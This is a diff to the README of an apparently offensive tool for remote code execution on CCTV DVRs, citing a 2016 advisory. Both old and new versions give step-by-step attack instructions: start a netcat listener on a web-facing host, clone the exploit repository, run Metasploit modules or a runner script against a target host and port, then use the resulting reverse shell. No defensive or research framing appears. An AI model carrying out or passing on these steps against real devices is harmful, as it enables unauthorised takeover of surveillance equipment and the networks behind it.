@@ -7,7 +7,7 @@ http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html
 
 Instructions for Use:
 
-Set up a cloud host or web facing IP.
+Set up a cloud host or web facing IP with metasploit and netcat installed
 
 Step 1:
 
@@ -15,7 +15,9 @@ On this cloud host type
 
 nc -l 666
 
-On another host 
+on the same host open another window and 
+
+
 
 Step 1:
 
@@ -28,34 +30,11 @@ git clone https://github.com/freddiebarrsmith/CCTV-Remote-Code-Execution-Metaspl
 
 Step 3:
 
-bash ipswitcher 1337.1337.1337.1337
-
-(substitute 1337 etc. for the IP of your cloud-facing host)
+bash runner.sh -h targethost -p targetport
 
 Step 4:
 
-type msfconsole
-
-Step 5:
-
-use exploit/linux/http/CCTV_DVRwrite
-set RHOST yourtargethost.com
-set RPORT 81
-exploit
-
-(then wait for it to execute, ignore errors for the most part)
-Step 6:
-
-use exploit/linux/http/CCTV_DVRrun
-set RHOST yourtargethost.com
-set RPORT 81
-exploit
-
-(then wait for it to execute, ignore errors for the most part)
-
-Step 7:
-
-go back to your cloud or web-facing ip netcat session and type in:
+go back to your netcat listener or web-facing ip netcat session and type in:
 
 whoami
 
